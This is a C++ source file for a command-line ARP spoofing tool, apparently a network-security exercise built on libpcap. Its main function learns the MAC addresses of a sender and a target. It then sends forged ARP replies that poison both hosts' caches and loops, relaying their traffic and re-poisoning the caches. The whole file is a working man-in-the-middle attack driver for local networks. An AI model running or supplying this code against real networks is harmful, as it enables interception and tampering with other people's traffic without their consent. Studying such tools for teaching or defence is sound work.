#include "main.h"

void usage() {
	printf("syntax: arp-spoof <interface> <sendIP> <targetIP> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    Spoof spoof;

    if (argc < 2 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

    char* dev = argv[1];
    
    //Attacker Mac
    spoof.GetAttackerMac(dev);
    //Attacker IP
    spoof.GetAttackerIP(dev);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);


    for (int i=2; i < argc; i+=2) {
        spoof.SetSendnTargetIp(argv[i], argv[i+1]);
        
        EthArpPacket packet;
        spoof.SetDefaultArpPacket(packet);

        //sender 
		spoof.SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), spoof.attackerMac_, ArpHdr::Request, spoof.attackerIP_, Mac("00:00:00:00:00:00"), spoof.senderIP_);
        spoof.SendArpPacket(pcap, &packet);
        spoof.GetSrcMac(pcap, "Sender");

        //target
		spoof.SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), spoof.attackerMac_, ArpHdr::Request, spoof.attackerIP_, Mac("00:00:00:00:00:00"), spoof.targetIP_);
		spoof.SendArpPacket(pcap, &packet);
        spoof.GetSrcMac(pcap, "Target");
        
        //Send ARP Infection
        spoof.SetPacket(packet, spoof.senderMac_, spoof.attackerMac_, ArpHdr::Reply, spoof.targetIP_, spoof.senderMac_, spoof.senderIP_);
		spoof.SendArpPacket(pcap, &packet);

        //Target ARP Infection
        spoof.SetPacket(packet, spoof.targetMac_, spoof.attackerMac_, ArpHdr::Reply, spoof.senderIP_, spoof.targetMac_, spoof.targetIP_);
        spoof.SendArpPacket(pcap, &packet);

        while (1) {
            if (spoof.RelayPacket(pcap)) {
                //Send ARP Infection
                spoof.SetPacket(packet, spoof.senderMac_, spoof.attackerMac_, ArpHdr::Reply, spoof.targetIP_, spoof.senderMac_, spoof.senderIP_);
                spoof.SendArpPacket(pcap, &packet);

                //Target ARP Infection
                spoof.SetPacket(packet, spoof.targetMac_, spoof.attackerMac_, ArpHdr::Reply, spoof.senderIP_, spoof.targetMac_, spoof.targetIP_);
                spoof.SendArpPacket(pcap, &packet);
            }
        }
        
    }

    pcap_close(pcap);

    return 0;
}